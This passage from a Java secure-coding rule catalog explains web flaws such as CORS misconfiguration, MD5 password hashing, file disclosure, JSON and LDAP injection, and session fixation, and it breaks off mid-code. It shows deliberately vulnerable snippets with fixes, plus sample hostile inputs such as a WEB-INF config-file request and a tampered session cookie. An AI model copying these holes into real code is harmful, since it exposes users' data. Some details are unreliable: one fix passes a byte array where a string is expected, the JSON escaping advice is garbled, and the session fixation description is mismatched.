Prior to HTML5, Web browsers enforced the Same Origin Policy which ensures that in order for JavaScript to access the contents of a Web page, both the JavaScript and the Web page must originate from the same domain. Without the Same Origin Policy, a malicious website could serve up JavaScript that loads sensitive information from other websites using a client's credentials, cull through it, and communicate it back to the attacker. HTML5 makes it possible for JavaScript to access data across domains if a new HTTP header called Access-Control-Allow-Origin is defined. With this header, a Web server defines which other domains are allowed to access its domain using cross-origin requests. However, caution should be taken when defining the header because an overly permissive CORS policy will allow a malicious application to communicate with the victim application in an inappropriate way, leading to spoofing, data theft, relay and other attacks.
</p>
<p>
<b>Vulnerable Code:</b>
<pre>response.addHeader("Access-Control-Allow-Origin", "*");</pre>
</p>
<p>
<b>Solution:</b>
<br/>
Avoid using * as the value of the Access-Control-Allow-Origin header, which indicates that the application's data is accessible to JavaScript running on any domain.
</p></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>high</p>
<h1 id="references">References</h1>
<p><a href="https://www.w3.org/TR/cors/">W3C Cross-Origin Resource Sharing</a><br/>
<a href="http://enable-cors.org/">Enable Cross-Origin Resource Sharing</a><br/>
</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7503">MD2, MD4 and MD5 are weak hash functions</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 2 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>MD2, MD4 and MD5 are weak hash functions</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>The algorithms MD2, MD4 and MD5 are not a recommended MessageDigest. <b>PBKDF2</b> should be used to hash password for example.</p></p>
<blockquote>
    "The security of the MD5 hash function is severely compromised. A collision attack exists that can find collisions
    within seconds on a computer with a 2.6 GHz Pentium 4 processor (complexity of 2<sup>24.1</sup>).[1] Further, there is also a
    chosen-prefix collision attack that can produce a collision for two inputs with specified prefixes within hours, using
    off-the-shelf computing hardware (complexity 2<sup>39</sup>).[2]"<br/>
    - <a href="https://en.wikipedia.org/wiki/MD5#Security">Wikipedia: MD5 - Security</a>
</blockquote>
<blockquote>
    "<b>SHA-224, SHA-256, SHA-384, SHA-512, SHA-512/224, and SHA-512/256</b>:<br/>
    The use of these hash functions is acceptable for all hash function applications."<br/>
    - <a href="http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf">NIST: Transitions: Recommendation for Transitioning the Use of Cryptographic Algorithms and Key Lengths p.15</a>
</blockquote>
<blockquote>
    "The main idea of a PBKDF is to slow dictionary or brute force attacks on the passwords by increasing the time
    needed to test each password. An attacker with a list of likely passwords can evaluate the PBKDF using the known
    iteration counter and the salt. Since an attacker has to spend a significant amount of computing time for each try,
    it becomes harder to apply the dictionary or brute force attacks."<br/>
- <a href="http://csrc.nist.gov/publications/nistpubs/800-132/nist-sp800-132.pdf">NIST: Recommendation for Password-Based Key Derivation  p.12</a>
</blockquote>
<p><br/>
<p>
<b>Vulnerable Code:</b><br/>
<pre>MessageDigest md5Digest = MessageDigest.getInstance("MD5");
    md5Digest.update(password.getBytes());
    byte[] hashValue = md5Digest.digest();</pre></p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="nt">&lt;pre&gt;</span>byte[] hashValue = DigestUtils.getMd5Digest().digest(password.getBytes());<span class="nt">&lt;/pre&gt;</span>
</pre></div>
</td></tr></table>
</p>
<p>
<b>Solution (Using bouncy castle):</b><br/>
<pre>public static byte[] getEncryptedPassword(String password, byte[] salt) throws NoSuchAlgorithmException, InvalidKeySpecException {
    PKCS5S2ParametersGenerator gen = new PKCS5S2ParametersGenerator(new SHA256Digest());
    gen.init(password.getBytes("UTF-8"), salt.getBytes(), 4096);
    return ((KeyParameter) gen.generateDerivedParameters(256)).getKey();
}</pre>
<b>Solution (Java 8 and later):</b><br/>
<pre>public static byte[] getEncryptedPassword(String password, byte[] salt) throws NoSuchAlgorithmException, InvalidKeySpecException {
    KeySpec spec = new PBEKeySpec(password.toCharArray(), salt, 4096, 256 * 8);
    SecretKeyFactory f = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256");
    return f.generateSecret(spec).getEncoded();
}</pre>
</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>high</p>
<h1 id="references">References</h1>
<p>[1] <a href="http://www.win.tue.nl/hashclash/On%20Collisions%20for%20MD5%20-%20M.M.J.%20Stevens.pdf">On Collisions for MD5</a>: Master Thesis by M.M.J. Stevens<br/>
[2] <a href="http://homepages.cwi.nl/~stevens/papers/stJOC%20-%20Chosen-Prefix%20Collisions%20for%20MD5%20and%20Applications.pdf">Chosen-prefix collisions for MD5 and applications</a>: Paper written by Marc Stevens<br/>
[3]<a href="https://en.wikipedia.org/wiki/MD5">Wikipedia: MD5</a><br/>
[4]<a href="http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf">NIST: Transitions: Recommendation for Transitioning the Use of Cryptographic Algorithms and Key Lengths</a><br/>
[5]<a href="http://csrc.nist.gov/publications/nistpubs/800-132/nist-sp800-132.pdf">NIST: Recommendation for Password-Based Key Derivation</a><br/>
[6]<a href="https://stackoverflow.com/q/22580853/89769">Stackoverflow: Reliable implementation of PBKDF2-HMAC-SHA256 for Java</a><br/>
[7]<a href="http://cwe.mitre.org/data/definitions/327.html">CWE-327: Use of a Broken or Risky Cryptographic Algorithm</a>
</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1092">Bean Manipulation</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>When software does not validate input properly, an attacker is able to craft the input in a form that is not expected by the rest of the application.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>Bean manipulation will lead to parts of the system receiving unintended input, which may result in altered control flow, arbitrary control of a resource, or arbitrary code execution.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications.</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7470">Struts File Disclosure</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Struts File Disclosure</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>
Constructing a server-side redirect path with user input could allow an attacker to download application binaries (including application classes or jar files) or view arbitrary files within protected directories.<br/>
An attacker may be able to forge a request parameter to match sensitive file locations. For example, requesting "http://example.com/?returnURL=WEB-INF/applicationContext.xml" would display the application's applicationContext.xml file. The attacker would be able to locate and download the applicationContext.xml referenced in the other configuration files, and even class files or jar files, obtaining sensitive information and launching other types of attacks.
</p>
<p>
<b>Vulnerable Code:</b><br/>
<pre>... 
String returnURL = request.getParameter("returnURL"); 
Return new ActionForward(returnURL); 
...</pre>
</p>
<p>
<b>Solution:</b><br/>
Avoid constructing server-side redirects using user controlled input.
</p></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>high</p>
<h1 id="references">References</h1>
<p><a href="https://cwe.mitre.org/data/definitions/552.html">CWE-552: Files or Directories Accessible to External Parties</a><br/></p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1105">JSON Injection</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>JSON is a syntax for serializing objects, arrays, numbers, strings, booleans, and null, typically used by applications to store date or send messages.
For example, the following example is the simplest Key→Value example of JSON (name/value pairs, key-value pairs):</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="p">{</span> <span class="s">"UserName"</span><span class="o">:</span> <span class="s">"xxser"</span><span class="p">,</span> <span class="s">"PassWord"</span><span class="o">:</span> <span class="s">"nike"</span><span class="p">,</span> <span class="s">"email"</span><span class="o">:</span> <span class="s">"root@secbug.org"</span> <span class="p">}</span>
</pre></div>
</td></tr></table>
<p>After understanding the basic JSON knowledge, let's look at the injection in JSON.
In the basics of JSON, we learned that JSON distinguishes the meaning of each character based on quotation marks ("), colons (:), commas (,), and curly braces ({}). If a malicious user injects maliciously into JSON Character, then JSON will parse failure. For example, the value of PassWord is:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">Admin</span><span class="s">"888</span>
</pre></div>
</td></tr></table>
<p>Then the assembled JSON data bits are as follows:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="s">"PassWord"</span><span class="o">:</span> <span class="s">"admin"</span><span class="mi">888</span><span class="s">"</span>
</pre></div>
</td></tr></table>
<p>The quotation marks in PassWord will destroy the entire JSON structure, causing JSON parsing to fail.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>When an application uses untrusted user inputs to construct a JSON file, attackers may inject arbitrary elements that cause a parsing error or even change the structure of the JSON file.  JSON injection can also lead to code execution or cross-site scripting.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>1 Escape its key characters. Such as:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="s">"admin"</span><span class="mi">888</span><span class="s">"</span>
</pre></div>
</td></tr></table>
<p>Convert to
<code>c
"admin\"888"</code>c
This way the value of JSON can be parsed. If "\" appears in the string, you also need to escape it to "\".
2 Use some third-party components. Taking Java as an example, using JSON-lib.jar to form JSON data can effectively avoid JSON injection.</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7483">Untrusted session cookie value</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Untrusted session cookie value</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>
The method <a href="http://docs.oracle.com/javaee/6/api/javax/servlet/http/HttpServletRequest.html#getRequestedSessionId()"><code>HttpServletRequest.getRequestedSessionId()</code></a>
typically returns the value of the cookie <code>JSESSIONID</code>. This value is normally only accessed by the session management logic and not normal developer code.
</p>
<p>
The value passed to the client is generally an alphanumeric value (e.g., <code>JSESSIONID=jp6q31lq2myn</code>). However, the value can be altered by the client. 
The following HTTP request illustrates the potential modification.
<pre>
GET /somePage HTTP/1.1
Host: yourwebsite.com
User-Agent: Mozilla/5.0
Cookie: JSESSIONID=Any value of the user's choice!!??'''"&gt;
</pre>
</p>
<p>As such, the JSESSIONID should only be used to see if its value matches an existing session ID. If it does not, the user should be 
considered an unauthenticated user. In addition, the session ID value should never be logged. If it is, then the log file could contain 
valid active session IDs, allowing an insider to hijack any sessions whose IDs have been logged and are still active.
</p></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>low</p>
<h1 id="references">References</h1>
<p><a href="https://www.owasp.org/index.php/Session_Management_Cheat_Sheet">OWASP: Session Management Cheat Sheet</a><br/>
<a href="http://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7489">Cookie without the secure flag</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#reference">Reference</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Cookie without the secure flag</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>
A new cookie is created without the <code>Secure</code> flag set.
The <code>Secure</code> flag is a directive to the browser to make sure that the cookie is not sent for insecure
communication (<code>http://</code>).
</p></p>
<p>
<b>Code at risk:</b><br/>
<pre>
Cookie cookie = new Cookie("userName",userName);
response.addCookie(cookie);
</pre>
</p>
<p>
<b>Solution (Specific configuration):</b><br/>
<pre>
Cookie cookie = new Cookie("userName",userName);
cookie.setSecure(true); // Secure flag
cookie.setHttpOnly(true);
</pre>
</p>
<p>
<b>Solution (Servlet 3.0 configuration):</b><br/>
<pre>
&lt;web-app xmlns="http://java.sun.com/xml/ns/javaee" version="3.0"&gt;
[...]
&lt;session-config&gt;
 &lt;cookie-config&gt;
  &lt;http-only&gt;true&lt;/http-only&gt;
  &lt;secure&gt;true&lt;/secure&gt;
 &lt;/cookie-config&gt;
&lt;/session-config&gt;
&lt;/web-app&gt;
</pre>
</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>medium</p>
<h1 id="reference">Reference</h1>
<p><a href="https://cwe.mitre.org/data/definitions/614.html">CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute</a><br/>
<a href="https://cwe.mitre.org/data/definitions/315.html">CWE-315: Cleartext Storage of Sensitive Information in a Cookie</a><br/>
<a href="https://cwe.mitre.org/data/definitions/311.html">CWE-311: Missing Encryption of Sensitive Data</a><br/>
<a href="https://www.owasp.org/index.php/SecureFlag">OWASP: Secure Flag</a><br/>
<a href="https://www.rapid7.com/db/vulnerabilities/http-cookie-secure-flag">Rapid7: Missing Secure Flag From SSL Cookie</a></p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7484">Untrusted query string</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Untrusted query string</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>The query string is the concatenation of the GET parameter names and values. Parameters other than those intended can
be passed in.</p>
<p>For the URL request <code>/app/servlet.htm?a=1&amp;b=2</code>, the query string extract will be <code>a=1&amp;b=2</code></p>
<p>Just as is true for individual parameter values retrieved via methods like <code>HttpServletRequest.getParameter()</code>, 
the value obtained from <code>HttpServletRequest.getQueryString()</code> should be considered unsafe.
You may need to validate or sanitize anything pulled from the query string before passing it to sensitive APIs. 
</p>
<br/>
<p>
<b>Reference</b><br/>
<a href="http://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a>
</p></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>low</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE0133">Session Fixation</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable code Example</a></li>
<li><a href="#fixed-code-example">Fixed code Example</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>The product downloads source code or an executable from a remote location and executes the code without sufficiently verifying the origin and integrity of the code. </p>
<p>Such a scenario is commonly observed when:
1. A web application authenticates a user without first invalidating the existing session, thereby continuing to use the session already associated with the user.
2. An attacker is able to force a known session identifier on a user so that, once the user authenticates, the attacker has access to the authenticated session.
3. The application or container uses predictable session identifiers. In the generic exploit of session fixation vulnerabilities, an attacker creates a new session on a web application and records the associated session identifier. The attacker then causes the victim to associate, and possibly authenticate, against the server using that session identifier, giving the attacker access to the user's account through the active session. </p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>An attacker is able to force a known session identifier on a user so that, once the user authenticates, the attacker has access to the authenticated session. </p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>Invalidate any existing session identifiers prior to authorizing a new user session. </p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Critical</p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable code Example</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">HttpSession</span> <span class="n">session</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getSession</span><span class="o">();</span>  
<span class="n">session</span><span class="o">.</span><span class="na">setAttribute</span><span class="o">(</span><span class="s">"data"</span><span class="o">,</span> <span class="s">"DD"</span><span class="o">);</span>
</pre></div>
</td></tr></table>
<h3 id="fixed-code-example">Fixed code Example</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">HttpSession</span> <span class="n">session</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getSession</span><span class="o">();</span>  
<span class="n">session</span><span class="o">.</span><span class="na">invalidate</span><span class="o">();</span>  
<span class="n">session</span><span class="o">.</span><span class="na">setAttribute</span><span class="o">(</span><span class="s">"data"</span><span class="o">,</span> <span class="s">"DD"</span><span class="o">);</span>
</pre></div>
</td></tr></table>
<p>Use invalidate() to invalidate current session identifier.</p>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cwe">
<p>http://cwe.mitre.org/data/definitions/384.html <a class="footnote-backref" href="#fnref-cwe" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/cwe-384.html">CWE-384</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7469">Spring File Disclosure</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Spring File Disclosure</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>
Constructing a server-side redirect path with user input could allow an attacker to download application binaries (including application classes or jar files) or view arbitrary files within protected directories.<br/>
An attacker may be able to forge a request parameter to match sensitive file locations. For example, requesting "http://example.com/?returnURL=WEB-INF/applicationContext.xml" would display the application's applicationContext.xml file. The attacker would be able to locate and download the applicationContext.xml referenced in the other configuration files, and even class files or jar files, obtaining sensitive information and launching other types of attacks.
</p>
<p>
<b>Vulnerable Code:</b><br/>
<pre>... 
String returnURL = request.getParameter("returnURL");
return new ModelAndView(returnURL); 
...</pre>
</p>
<p>
<b>Solution:</b><br/>
Avoid constructing server-side redirects using user controlled input.
</p>
<br/>
<p>
<b>References</b><br/>
<a href="https://cwe.mitre.org/data/definitions/552.html">CWE-552: Files or Directories Accessible to External Parties</a><br/>
</p></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>high</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1097">LDAP Manipulation</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 2 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable Code Example</a></li>
<li><a href="#fixed-code-example">Fixed Code Example</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>The Lightweight Directory Access Protocol (LDAP) allows an application to remotely perform operations such as searching and modifying records in directories.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>LDAP injection results from inadequate input sanitization and validation and allows malicious users to glean restricted information using the directory service.</p>
<p>An authentication routine that permitted LDAP injection would allow unauthorized users to log in. Likewise, a search routine would allow an attacker to discover part or all of the data in the directory.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications.</p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable Code Example</h3>
<p>This vulnerable code example allows a caller of the method searchRecord() to search for a record in the directory using the LDAP protocol:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="c1">// String userSN = "S*"; // Invalid</span>
<span class="c1">// String userPassword = "*"; // Invalid</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">LDAPInjection</span> <span class="o">{</span>       
  <span class="kd">private</span> <span class="kt">void</span> <span class="nf">searchRecord</span><span class="o">(</span><span class="n">String</span> <span class="n">userSN</span><span class="o">,</span> <span class="n">String</span> <span class="n">userPassword</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">NamingException</span> <span class="o">{</span>        
    <span class="n">Hashtable</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">String</span><span class="o">&gt;</span>  <span class="n">env</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Hashtable</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">String</span><span class="o">&gt;();</span>
    <span class="n">env</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">Context</span><span class="o">.</span><span class="na">INITIAL_CONTEXT_FACTORY</span><span class="o">,</span> <span class="s">"com.sun.jndi.ldap.LdapCtxFactory"</span><span class="o">);</span>
    <span class="k">try</span> <span class="o">{</span>
      <span class="n">DirContext</span> <span class="n">dctx</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InitialDirContext</span><span class="o">(</span><span class="n">env</span><span class="o">);</span>

      <span class="n">SearchControls</span> <span class="n">sc</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SearchControls</span><span class="o">();</span>
      <span class="n">String</span><span class="o">[]</span> <span class="n">attributeFilter</span> <span class="o">=</span> <span class="o">{</span><span class="s">"cn"</span><span class="o">,</span> <span class="s">"mail"</span><span class="o">};</span>
      <span class="n">sc</span><span class="o">.</span><span class="na">setReturningAttributes</span><span class="o">(</span><span class="n">attributeFilter</span><span class="o">);</span>
